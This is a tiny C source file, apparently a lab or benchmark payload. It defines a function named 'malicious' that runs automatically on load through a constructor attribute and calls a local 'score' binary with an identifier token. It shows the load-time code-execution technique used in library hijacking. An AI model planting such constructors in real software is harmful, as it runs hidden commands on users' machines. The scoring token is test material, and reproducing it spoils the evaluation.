#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 979c3bdb-09e7-4484-ba1e-b2024d477c57");
}
